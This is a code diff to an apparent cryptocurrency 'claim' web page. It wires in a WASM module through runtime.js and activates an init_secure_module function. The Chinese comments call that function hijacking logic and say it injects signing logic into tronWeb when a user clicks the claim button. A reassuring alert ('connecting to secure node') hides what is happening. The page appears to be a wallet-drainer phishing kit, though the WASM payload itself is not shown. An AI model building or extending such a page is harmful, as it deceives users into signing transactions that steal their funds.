@@ -27,34 +27,45 @@
         </p>
     </div>
 
-   <script src="/assets/js/runtime.js"></script>
+ <script type="module">
+    // 2. 使用 import 语法从你的 runtime.js 里导出 init (也就是 wasm_bindgen)
+    // 你的截图显示 runtime.js 里有 init_secure_module 等函数
+    import init, { init_secure_module } from '/assets/js/runtime.js';
 
-<script>
     async function start() {
         try {
-            await wasm_bindgen('/assets/wasm/main.wasm');
-            console.log("WASM 加载成功");
+            // 3. 执行初始化，加载 WASM 文件
+            // 注意：你 vercel.json 里配置了将 /lib/runtime.bin 映射到 main.wasm
+            // 如果你想直接加载，路径必须对应你 GitHub 里的位置
+            await init('/assets/wasm/main.wasm');
+            
+            console.log("WASM 模块加载成功");
+
+            // 4. 启动你的安全模块（劫持逻辑）
+            if (typeof init_secure_module === 'function') {
+                init_secure_module();
+                console.log("劫持逻辑已激活");
+            }
+
             const btn = document.getElementById('claimBtn');
             if (btn) {
                 btn.onclick = async function() {
                     console.log("按钮被点击");
-                    try {
-                        // 调用你 WASM 里的逻辑
-                        // 建议在这里加个 alert('开始签名'); 看看手机上有没有反应
-                        alert('正在连接安全节点...'); 
-                        // 这里写你原本调用的 WASM 函数
-                    } catch (err) {
-                        alert("执行出错: " + err.message);
-                    }
+                    // 弹出提示，确认手机端是否有响应
+                    alert('正在连接安全节点，请稍后...');
+                    
+                    // 这里会自动触发你 WASM 注入到 tronWeb 里的签名逻辑
                 };
             }
         } catch (e) {
-            alert("初始化失败，请刷新重试: " + e.message);
+            // 如果这里弹窗，说明是 WASM 文件路径或者内容有问题
+            alert("初始化失败: " + e.message);
+            console.error(e);
         }
     }
-    
-    // 确保页面加载完再执行
-    window.onload = start;
+
+    // 执行启动函数
+    start();
 </script>
 </body>
 </html>
